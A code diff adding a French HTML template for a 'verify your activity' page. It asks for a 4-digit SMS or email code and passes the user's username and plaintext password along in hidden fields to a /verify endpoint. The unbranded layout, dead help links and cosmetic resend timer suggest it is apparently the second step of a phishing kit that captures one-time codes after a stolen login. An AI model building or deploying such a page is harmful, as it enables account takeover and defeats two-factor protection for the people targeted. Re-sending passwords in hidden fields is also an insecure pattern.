@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérifie ton activité</title>
+  <style>
+    /* Réinitialisation de base pour tous les éléments */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    /* Styles pour le corps de la page et HTML */
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+
+      /* Image de fond : */
+      background: #f2f2f2 url("{{ url_for('static', filename='img/background.jpg') }}") no-repeat center center fixed;
+      background-size: cover;
+      background-position: center center;
+
+      /* Flexbox pour centrer le contenu (la modal) sur la page */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* Ajustement mobile pour l'image de fond (positionnement) */
+    @media (max-width: 480px) {
+      html, body {
+        background-position: center 30%;
+      }
+    }
+
+    /* Styles de la boîte modale (la carte blanche au centre) */
+    .modal {
+      background-color: white;
+      width: 90%;
+      max-width: 400px;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    /* Titre (h2) dans la modal */
+    h2 {
+      font-size: 22px;
+      color: #333;
+      margin-bottom: 25px;
+      font-weight: normal;
+    }
+
+    /* Texte d'instruction sous le titre */
+    .instruction-text {
+      font-size: 15px;
+      color: #555;
+      margin-bottom: 25px;
+      line-height: 1.4;
+    }
+
+    /* Numéro de téléphone en gras */
+    .phone-number {
+      font-weight: bold;
+    }
+
+    /* Conteneur pour l'input de code */
+    .input-container {
+      margin-bottom: 20px;
+    }
+
+    /* Champ de saisie du code */
+    input[type="text"] {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 16px;
+      text-align: center;
+    }
+
+    /* Conteneur de la case à cocher et de son label */
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      margin-bottom: 30px;
+      font-size: 14px;
+      color: #555;
+      text-align: left;
+    }
+
+    /* Style personnalisé de la case à cocher */
+    .checkbox-container input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      cursor: pointer;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    /* Style de la case à cocher quand elle est cochée */
+    .checkbox-container input[type="checkbox"]:checked {
+      background-color: #4CAF50;
+      border-color: #4CAF50;
+    }
+
+    /* Le "v" (coche) à l'intérieur de la case à cocher quand elle est cochée */
+    .checkbox-container input[type="checkbox"]:checked::after {
+      content: '✔';
+      font-size: 14px;
+      color: white;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      line-height: 1;
+    }
+
+    /* Style du bouton "Vérifier" */
+    button {
+      width: 100%;
+      background-color: #6DC0B6;
+      color: white;
+      padding: 12px;
+      font-size: 17px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    /* Style du bouton au survol */
+    button:hover {
+      background-color: #5aa79f;
+    }
+
+    /* Conteneur des liens du bas */
+    .bottom-links {
+      font-size: 14px;
+      color: #777;
+    }
+
+    /* Liens individuels dans le conteneur du bas */
+    .bottom-links a {
+      color: #6DC0B6;
+      text-decoration: none;
+      margin-top: 10px;
+      display: block;
+    }
+
+    /* Style des liens au survol */
+    .bottom-links a:hover {
+      text-decoration: underline;
+    }
+
+    /* Style pour le texte du décompte */
+    #countdown-text {
+      color: #777;
+    }
+
+    /* Style pour le lien "Demander un nouveau code" quand il est désactivé */
+    #request-code-link.disabled {
+      color: #aaa;
+      pointer-events: none;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="modal">
+    <h2>Vérifie ton activité</h2>
+    <p class="instruction-text">
+      Un code à 4 chiffres vous à été envoyé par sms <br>
+      <span class="phone-number">Ou par email</span>
+    </p>
+
+    <!-- FORMULAIRE CORRIGÉ : L'action pointe maintenant vers /verify -->
+    <form action="/verify" method="post">
+      <div class="input-container">
+        <input type="text" name="verification_code" placeholder="Entrer le code" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required>
+
+        <!-- Champs cachés pour passer des données supplémentaires à votre backend -->
+        <input type="hidden" name="username" value="{{ username }}">
+        <input type="hidden" name="password" value="{{ password }}">
+      </div>
+
+      <div class="checkbox-container">
+        <input type="checkbox" id="rememberDevice" checked>
+        <label for="rememberDevice">
+          Se souvenir de cet appareil<br>
+          Aucun code de vérification ne te sera demandé lors de ta prochaine connexion.
+        </label>
+      </div>
+
+      <button type="submit">Vérifier</button>
+    </form>
+
+    <div class="bottom-links">
+      <span id="countdown-text">Demander un code dans <span id="countdown">0:25</span></span> <br>
+      Un problème ? <a href="#">Obtenir de l'aide</a>
+      <a href="#" id="request-code-link" style="display: none;">Demander un nouveau code</a>
+    </div>
+  </div>
+
+  <script>
+    let timeLeft = 25;
+    const countdownElement = document.getElementById('countdown');
+    const countdownTextElement = document.getElementById('countdown-text');
+    const requestCodeLink = document.getElementById('request-code-link');
+    let timer;
+
+    function updateCountdown() {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      countdownElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        countdownTextElement.style.display = 'none';
+        requestCodeLink.style.display = 'block';
+      } else {
+        timeLeft--;
+      }
+    }
+
+    timer = setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    requestCodeLink.addEventListener('click', function(event) {
+      event.preventDefault();
+      alert('Un nouveau code a été demandé ! (fonctionnalité à implémenter côté serveur)');
+      timeLeft = 25;
+      countdownTextElement.style.display = 'inline';
+      requestCodeLink.style.display = 'none';
+      clearInterval(timer);
+      timer = setInterval(updateCountdown, 1000);
+      updateCountdown();
+    });
+  </script>
+</body>
+</html>
